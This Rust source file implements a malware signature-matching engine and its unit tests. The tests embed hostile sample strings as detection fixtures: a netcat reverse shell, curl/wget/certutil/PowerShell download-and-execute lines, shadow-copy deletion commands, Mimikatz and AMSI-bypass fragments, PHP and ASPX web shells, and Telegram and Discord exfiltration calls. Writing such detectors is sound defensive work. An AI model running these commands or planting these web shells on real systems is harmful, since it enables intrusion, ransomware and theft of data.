use anyhow::{Context, Result};
use hex;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::{HashMap, HashSet};
use std::path::Path;
use std::sync::Arc;
use tokio::fs;
use tracing::{debug, info, warn};

/// Signature types supported by the matcher
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Hash)]
pub enum SignatureType {
    FileHash,
    BinaryPattern,
    StringPattern,
    ImportTable,
    SectionHash,
    Behavior,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SignatureMatch {
    pub signature_id: String,
    pub signature_name: String,
    pub signature_type: SignatureType,
    pub threat_family: String,
    pub severity: ThreatSeverity,
    pub confidence: f32,
    pub matched_offset: Option<usize>,
    pub matched_data: Option<String>,
    pub description: String,
    pub metadata: HashMap<String, String>,
}

/// Threat severity levels
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum ThreatSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

/// Signature definition
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Signature {
    pub id: String,
    pub name: String,
    pub signature_type: SignatureType,
    pub threat_family: String,
    pub severity: ThreatSeverity,
    pub patterns: Vec<SignaturePattern>,
    pub description: String,
    pub metadata: HashMap<String, String>,
    pub enabled: bool,
    /// Confidence a match carries. Below 0.7 the engine votes suspicious
    /// rather than malicious, for patterns that also show up in harmless text
    /// (tool names, commands people write about). Default 0.85.
    #[serde(default)]
    pub confidence: Option<f32>,
    #[serde(default)]
    pub scope: SignatureScope,
}

/// Where a string signature is checked.
#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum SignatureScope {
    /// Any content, web pages included.
    #[default]
    Any,
    /// Files and scripts, but not HTML pages. A URL scan reads the page's
    /// HTML, where a blog post quoting a command must not count as the
    /// command itself.
    NotHtml,
}

/// Default confidence of a string or regex match.
const DEFAULT_MATCH_CONFIDENCE: f32 = 0.85;

/// Pattern within a signature
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SignaturePattern {
    pub pattern_type: PatternType,
    pub value: String,
    pub offset: Option<usize>,
    pub wildcard: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum PatternType {
    Hex,
    String,
    Regex,
    Hash,
}

/// Configuration for signature matcher
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SignatureMatcherConfig {
    pub signatures_dir: String,
    pub max_file_size: usize,
    pub enable_caching: bool,
    pub cache_ttl_seconds: u64,
    pub parallel_matching: bool,
    pub max_matches_per_file: usize,
}

impl Default for SignatureMatcherConfig {
    fn default() -> Self {
        Self {
            signatures_dir: "./rules/signatures".to_string(),
            max_file_size: 100 * 1024 * 1024, // 100MB
            enable_caching: true,
            cache_ttl_seconds: 3600,
            parallel_matching: true,
            max_matches_per_file: 1000,
        }
    }
}

/// Main signature matcher engine
pub struct SignatureMatcher {
    config: SignatureMatcherConfig,
    signatures: Arc<HashMap<SignatureType, Vec<Signature>>>,
    hash_cache: Arc<tokio::sync::RwLock<HashMap<String, Vec<SignatureMatch>>>>,
}

impl SignatureMatcher {
    /// Create a new signature matcher instance
    pub async fn new(config: SignatureMatcherConfig) -> Result<Self> {
        info!("Initializing signature matcher with config: {:?}", config);

        let signatures = Self::load_signatures(&config.signatures_dir)
            .await
            .context("Failed to load signatures")?;

        let signature_count: usize = signatures.values().map(|v| v.len()).sum();
        info!(
            "Loaded {} signatures across {} types",
            signature_count,
            signatures.len()
        );

        Ok(Self {
            config,
            signatures: Arc::new(signatures),
            hash_cache: Arc::new(tokio::sync::RwLock::new(HashMap::new())),
        })
    }

    /// Total number of loaded signatures across all categories
    pub fn signature_count(&self) -> usize {
        self.signatures.values().map(|v| v.len()).sum()
    }

    /// Load signatures from directory
    async fn load_signatures(dir: &str) -> Result<HashMap<SignatureType, Vec<Signature>>> {
        let path = Path::new(dir);

        if !path.exists() {
            warn!("Signatures directory does not exist: {}", dir);
            return Ok(HashMap::new());
        }

        let mut signatures: HashMap<SignatureType, Vec<Signature>> = HashMap::new();
        let mut entries = fs::read_dir(path).await?;

        while let Some(entry) = entries.next_entry().await? {
            let path = entry.path();

            if path.extension().and_then(|s| s.to_str()) == Some("json") {
                match Self::load_signature_file(&path).await {
                    Ok(sigs) => {
                        for sig in sigs {
                            if sig.enabled {
                                signatures
                                    .entry(sig.signature_type.clone())
                                    .or_default()
                                    .push(sig);
                            }
                        }
                    }
                    Err(e) => {
                        warn!("Failed to load signature file {:?}: {}", path, e);
                    }
                }
            }
        }

        Ok(signatures)
    }

    /// Load signatures from a single file
    async fn load_signature_file(path: &Path) -> Result<Vec<Signature>> {
        let content = fs::read_to_string(path).await?;
        let signatures: Vec<Signature> = serde_json::from_str(&content)?;
        Ok(signatures)
    }

    /// Match file against all signatures
    pub async fn match_file(&self, file_path: &Path) -> Result<Vec<SignatureMatch>> {
        debug!("Matching file: {:?}", file_path);

        // Check file size
        let metadata = fs::metadata(file_path).await?;
        if metadata.len() > self.config.max_file_size as u64 {
            warn!(
                "File too large for signature matching: {} bytes",
                metadata.len()
            );
            return Ok(Vec::new());
        }

        // Read file content
        let content = fs::read(file_path).await?;

        // Perform matching
        self.match_bytes(&content).await
    }

    /// Match byte content against signatures
    pub async fn match_bytes(&self, content: &[u8]) -> Result<Vec<SignatureMatch>> {
        let mut matches = Vec::new();

        // Check hash cache first
        let file_hash = self.calculate_sha256(content);

        if self.config.enable_caching {
            let cache = self.hash_cache.read().await;
            if let Some(cached_matches) = cache.get(&file_hash) {
                debug!("Using cached signature matches");
                return Ok(cached_matches.clone());
            }
        }

        // Match file hash signatures
        if let Some(hash_sigs) = self.signatures.get(&SignatureType::FileHash) {
            matches.extend(self.match_hash_signatures(content, hash_sigs));
        }

        // Match binary pattern signatures
        if let Some(binary_sigs) = self.signatures.get(&SignatureType::BinaryPattern) {
            matches.extend(self.match_binary_patterns(content, binary_sigs)?);
        }

        // Match string pattern signatures
        if let Some(string_sigs) = self.signatures.get(&SignatureType::StringPattern) {
            matches.extend(self.match_string_patterns(content, string_sigs)?);
        }

        // Match section hash signatures (PE files)
        if self.is_pe_file(content) {
            if let Some(section_sigs) = self.signatures.get(&SignatureType::SectionHash) {
                matches.extend(self.match_section_hashes(content, section_sigs)?);
            }
        }

        // Limit matches
        if matches.len() > self.config.max_matches_per_file {
            warn!(
                "Too many matches, truncating to {}",
                self.config.max_matches_per_file
            );
            matches.truncate(self.config.max_matches_per_file);
        }

        // Cache results
        if self.config.enable_caching {
            let mut cache = self.hash_cache.write().await;
            cache.insert(file_hash, matches.clone());
        }

        info!("Found {} signature matches", matches.len());
        Ok(matches)
    }

    /// Match hash-based signatures
    fn match_hash_signatures(
        &self,
        content: &[u8],
        signatures: &[Signature],
    ) -> Vec<SignatureMatch> {
        let mut matches = Vec::new();

        let sha256 = self.calculate_sha256(content);
        let md5 = self.calculate_md5(content);
        let sha1 = self.calculate_sha1(content);

        for sig in signatures {
            for pattern in &sig.patterns {
                if pattern.pattern_type == PatternType::Hash {
                    let hash_match =
                        pattern.value == sha256 || pattern.value == md5 || pattern.value == sha1;

                    if hash_match {
                        matches.push(SignatureMatch {
                            signature_id: sig.id.clone(),
                            signature_name: sig.name.clone(),
                            signature_type: sig.signature_type.clone(),
                            threat_family: sig.threat_family.clone(),
                            severity: sig.severity.clone(),
                            confidence: 1.0,
                            matched_offset: None,
                            matched_data: Some(pattern.value.clone()),
                            description: sig.description.clone(),
                            metadata: sig.metadata.clone(),
                        });
                        break;
                    }
                }
            }
        }

        matches
    }

    /// Match binary pattern signatures
    fn match_binary_patterns(
        &self,
        content: &[u8],
        signatures: &[Signature],
    ) -> Result<Vec<SignatureMatch>> {
        let mut matches = Vec::new();

        for sig in signatures {
            for pattern in &sig.patterns {
                if let PatternType::Hex = pattern.pattern_type {
                    let hex_pattern = Self::parse_hex_pattern(&pattern.value)?;

                    if let Some(offset) = Self::find_pattern(content, &hex_pattern, pattern.offset)
                    {
                        let confidence = if pattern.wildcard { 0.8 } else { 0.95 };

                        matches.push(SignatureMatch {
                            signature_id: sig.id.clone(),
                            signature_name: sig.name.clone(),
                            signature_type: sig.signature_type.clone(),
                            threat_family: sig.threat_family.clone(),
                            severity: sig.severity.clone(),
                            confidence,
                            matched_offset: Some(offset),
                            matched_data: Some(pattern.value.clone()),
                            description: sig.description.clone(),
                            metadata: sig.metadata.clone(),
                        });
                        break;
                    }
                }
            }
        }

        Ok(matches)
    }

    /// Match string pattern signatures
    fn match_string_patterns(
        &self,
        content: &[u8],
        signatures: &[Signature],
    ) -> Result<Vec<SignatureMatch>> {
        let mut matches = Vec::new();
        let text = String::from_utf8_lossy(content);
        let html = looks_like_html(content);

        for sig in signatures {
            if html && sig.scope == SignatureScope::NotHtml {
                continue;
            }
            for pattern in &sig.patterns {
                match pattern.pattern_type {
                    PatternType::String => {
                        if text.contains(&pattern.value) {
                            matches.push(self.create_match(sig, pattern, None));
                            break;
                        }
                    }
                    PatternType::Regex => {
                        if let Ok(re) = regex::Regex::new(&pattern.value) {
                            if re.is_match(&text) {
                                matches.push(self.create_match(sig, pattern, None));
                                break;
                            }
                        }
                    }
                    _ => {}
                }
            }
        }

        Ok(matches)
    }

    /// Match section hash signatures for PE files
    fn match_section_hashes(
        &self,
        content: &[u8],
        signatures: &[Signature],
    ) -> Result<Vec<SignatureMatch>> {
        let mut matches = Vec::new();

        // Extract PE sections and calculate hashes
        if let Ok(sections) = self.extract_pe_sections(content) {
            for sig in signatures {
                for pattern in &sig.patterns {
                    if pattern.pattern_type == PatternType::Hash
                        && sections.contains(&pattern.value)
                    {
                        matches.push(self.create_match(sig, pattern, None));
                        break;
                    }
                }
            }
        }

        Ok(matches)
    }

    /// Helper to create signature match
    fn create_match(
        &self,
        sig: &Signature,
        pattern: &SignaturePattern,
        offset: Option<usize>,
    ) -> SignatureMatch {
        SignatureMatch {
            signature_id: sig.id.clone(),
            signature_name: sig.name.clone(),
            signature_type: sig.signature_type.clone(),
            threat_family: sig.threat_family.clone(),
            severity: sig.severity.clone(),
            confidence: sig.confidence.unwrap_or(DEFAULT_MATCH_CONFIDENCE),
            matched_offset: offset,
            matched_data: Some(pattern.value.clone()),
            description: sig.description.clone(),
            metadata: sig.metadata.clone(),
        }
    }

    /// Parse hex pattern string
    fn parse_hex_pattern(pattern: &str) -> Result<Vec<u8>> {
        let cleaned = pattern.replace(" ", "").replace("??", "00");
        hex::decode(cleaned).context("Failed to parse hex pattern")
    }

    /// Find pattern in content
    fn find_pattern(content: &[u8], pattern: &[u8], offset: Option<usize>) -> Option<usize> {
        let start = offset.unwrap_or(0);

        if start >= content.len() {
            return None;
        }

        content[start..]
            .windows(pattern.len())
            .position(|window| window == pattern)
            .map(|pos| start + pos)
    }

    /// Check if content is a PE file
    fn is_pe_file(&self, content: &[u8]) -> bool {
        content.len() >= 64 && &content[0..2] == b"MZ"
    }

    /// Extract PE section hashes
    fn extract_pe_sections(&self, _content: &[u8]) -> Result<HashSet<String>> {
        // Simplified PE parsing - in production, use goblin or similar
        Ok(HashSet::new())
    }

    /// Calculate SHA256 hash
    fn calculate_sha256(&self, content: &[u8]) -> String {
        let mut hasher = Sha256::new();
        hasher.update(content);
        hex::encode(hasher.finalize())
    }

    /// Calculate MD5 hash
    fn calculate_md5(&self, content: &[u8]) -> String {
        use md5::{Digest, Md5};
        let mut hasher = Md5::new();
        hasher.update(content);
        hex::encode(hasher.finalize())
    }

    /// Calculate SHA1 hash
    fn calculate_sha1(&self, content: &[u8]) -> String {
        use sha1::{Digest, Sha1};
        let mut hasher = Sha1::new();
        hasher.update(content);
        hex::encode(hasher.finalize())
    }

    /// Reload signatures from disk
    pub async fn reload_signatures(&mut self) -> Result<()> {
        info!("Reloading signatures");
        let signatures = Self::load_signatures(&self.config.signatures_dir).await?;
        self.signatures = Arc::new(signatures);

        // Clear cache
        self.hash_cache.write().await.clear();

        Ok(())
    }

    /// Get signature statistics
    pub async fn get_statistics(&self) -> SignatureStatistics {
        let mut stats = SignatureStatistics::default();

        for (sig_type, sigs) in self.signatures.iter() {
            stats.total_signatures += sigs.len();
            stats.by_type.insert(sig_type.clone(), sigs.len());

            for sig in sigs {
                *stats.by_severity.entry(sig.severity.clone()).or_insert(0) += 1;
            }
        }

        stats.cache_size = self.hash_cache.read().await.len();

        stats
    }
}

/// Signature matcher statistics
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SignatureStatistics {
    pub total_signatures: usize,
    pub by_type: HashMap<SignatureType, usize>,
    pub by_severity: HashMap<ThreatSeverity, usize>,
    pub cache_size: usize,
}

/// Whether content is an HTML page: it opens with a doctype or an html, head
/// or body tag within its first 2 KB.
fn looks_like_html(content: &[u8]) -> bool {
    let head = String::from_utf8_lossy(&content[..content.len().min(2048)]).to_ascii_lowercase();
    let trimmed = head.trim_start_matches(|c: char| c.is_whitespace() || c == '\u{feff}');
    trimmed.starts_with('<')
        && ["<!doctype html", "<html", "<head", "<body"]
            .iter()
            .any(|t| trimmed.contains(t))
}

#[cfg(test)]
mod tests {
    use super::*;

    async fn shipped_matcher() -> SignatureMatcher {
        SignatureMatcher::new(SignatureMatcherConfig {
            signatures_dir: format!("{}/rules/signatures", env!("CARGO_MANIFEST_DIR")),
            enable_caching: false,
            ..Default::default()
        })
        .await
        .unwrap()
    }

    /// A file that fails to parse loads as zero signatures with only a
    /// warning, and a bad regex is silently skipped. Catch both here.
    #[tokio::test]
    async fn shipped_signatures_all_load_and_compile() {
        let path = format!(
            "{}/rules/signatures/default_signatures.json",
            env!("CARGO_MANIFEST_DIR")
        );
        let sigs: Vec<Signature> =
            serde_json::from_str(&std::fs::read_to_string(path).unwrap()).unwrap();
        assert!(sigs.len() >= 28);
        let mut ids = HashSet::new();
        for sig in &sigs {
            assert!(ids.insert(sig.id.clone()), "duplicate id {}", sig.id);
            for p in &sig.patterns {
                if p.pattern_type == PatternType::Regex {
                    regex::Regex::new(&p.value)
                        .unwrap_or_else(|e| panic!("{}: bad regex: {e}", sig.id));
                }
            }
        }
        assert_eq!(shipped_matcher().await.signature_count(), sigs.len());
    }

    #[tokio::test]
    async fn shipped_signatures_fire_on_their_samples() {
        let m = shipped_matcher().await;
        let samples: &[(&str, &str)] = &[
            ("SIG-007", "mimikatz # sekurlsa::logonpasswords"),
            ("SIG-008", r"CreateNamedPipeA(\\.\pipe\postex_8a2f)"),
            ("SIG-008", "MSSE-%d-server"),
            ("SIG-009", "ReflectiveLoader beacon.x64.dll"),
            ("SIG-010", "load ext_server_stdapi.x64.dll"),
            ("SIG-011", "Restore-My-Files.txt"),
            ("SIG-012", "RyukReadMe.html"),
            ("SIG-013", "cmd /c vssadmin.exe Delete Shadows /All /Quiet"),
            ("SIG-013", "bcdedit /set {default} recoveryenabled No"),
            ("SIG-014", "/bin/busybox MIRAI"),
            ("SIG-015", "-o stratum+tcp://pool.example.org:3333 -u wallet"),
            ("SIG-016", "SetValue($null,$true) # amsiInitFailed"),
            (
                "SIG-017",
                "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')",
            ),
            (
                "SIG-018",
                "certutil -urlcache -split -f http://198.51.100.7/a.exe a.exe",
            ),
            ("SIG-019", "mshta vbscript:Execute(\"x\")"),
            ("SIG-020", "regsvr32 /s /n /u /i:http://x/file.sct scrobj.dll"),
            ("SIG-021", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\""),
            ("SIG-022", "nc -e /bin/sh 203.0.113.5 4444"),
            ("SIG-022", "python3 -c 'import socket,subprocess,os;s=socket.socket()'"),
            (
                "SIG-023",
                "cd /tmp; wget http://203.0.113.9/bins.sh; chmod +x bins.sh",
            ),
            (
                "SIG-023",
                "curl -s http://203.0.113.9/x.sh | sh",
            ),
            ("SIG-024", "var s = new ActiveXObject(\"WScript.Shell\"); s.Run(c);"),
            ("SIG-025", "<?php @eval($_POST['cmd']); ?>"),
            ("SIG-025", "<?php system($_GET['c']); ?>"),
            (
                "SIG-026",
                "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"z\"],\"unsafe\");%>",
            ),
            (
                "SIG-027",
                "fetch('https://api.telegram.org/bot123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsawQ/sendMessage')",
            ),
            (
                "SIG-028",
                "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_abcd",
            ),
        ];
        for (id, sample) in samples {
            let hits = m.match_bytes(sample.as_bytes()).await.unwrap();
            assert!(
                hits.iter().any(|h| h.signature_id == *id),
                "{id} did not match {sample:?}; got {:?}",
                hits.iter().map(|h| &h.signature_id).collect::<Vec<_>>()
            );
        }
    }

    #[tokio::test]
    async fn ordinary_text_and_admin_commands_stay_clean() {
        let m = shipped_matcher().await;
        for clean in [
            "Hello, this is a clean file without any malicious strings.",
            "vssadmin list shadows",
            "vssadmin delete shadows /for=C: /oldest",
            "curl -fsSL https://get.docker.com | sh",
            "wget https://example.com/install.sh && chmod +x install.sh",
            "<?php echo htmlspecialchars($_POST['name']); ?>",
            "new ActiveXObject(\"Microsoft.XMLHTTP\")",
        ] {
            let hits = m.match_bytes(clean.as_bytes()).await.unwrap();
            assert!(hits.is_empty(), "{clean:?} matched {hits:?}");
        }
    }

    #[tokio::test]
    async fn file_only_signatures_skip_web_pages() {
        let m = shipped_matcher().await;
        let blog = "<!DOCTYPE html><html><head><title>Detecting Mimikatz</title></head>\
            <body><pre>sekurlsa::logonpasswords</pre><p>Attackers run \
            vssadmin delete shadows /all /quiet before encrypting.</p></body></html>";
        assert!(m.match_bytes(blog.as_bytes()).await.unwrap().is_empty());

        // A phishing kit's page that posts to a Telegram bot still matches:
        // that signature applies to pages too.
        let kit = "<html><body><script>fetch('https://api.telegram.org/bot123456789:\
            AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsawQ/sendMessage')</script></body></html>";
        let hits = m.match_bytes(kit.as_bytes()).await.unwrap();
        assert!(hits.iter().any(|h| h.signature_id == "SIG-027"));
    }

    #[tokio::test]
    async fn weaker_signatures_carry_lower_confidence() {
        let m = shipped_matcher().await;
        let hits = m
            .match_bytes(b"xmrig -o stratum+tcp://pool.example.org:3333")
            .await
            .unwrap();
        let miner = hits.iter().find(|h| h.signature_id == "SIG-015").unwrap();
        assert!(
            miner.confidence < 0.7,
            "should vote suspicious, not malicious"
        );
        let hits = m.match_bytes(b"RyukReadMe.txt").await.unwrap();
        assert_eq!(hits[0].confidence, DEFAULT_MATCH_CONFIDENCE);
    }

    #[test]
    fn html_detection() {
        assert!(looks_like_html(b"  <!doctype html><html>"));
        assert!(looks_like_html(b"<html lang=en><head>"));
        assert!(!looks_like_html(b"#!/bin/sh\necho <html>"));
        assert!(!looks_like_html(b"MZ\x90\x00<html>"));
        assert!(!looks_like_html(b"<?php system($_GET['c']); ?>"));
    }

    #[tokio::test]
    async fn test_signature_matcher_creation() {
        let config = SignatureMatcherConfig::default();
        let result = SignatureMatcher::new(config).await;
        assert!(result.is_ok());
    }

    #[test]
    fn test_hex_pattern_parsing() {
        let pattern = "4D 5A 90 00";
        let result = SignatureMatcher::parse_hex_pattern(pattern);
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), vec![0x4D, 0x5A, 0x90, 0x00]);
    }

    #[test]
    fn test_pattern_matching() {
        let content = b"MZ\x90\x00\x03\x00\x00\x00";
        let pattern = vec![0x4D, 0x5A, 0x90, 0x00];

        let result = SignatureMatcher::find_pattern(content, &pattern, None);
        assert_eq!(result, Some(0));
    }
}
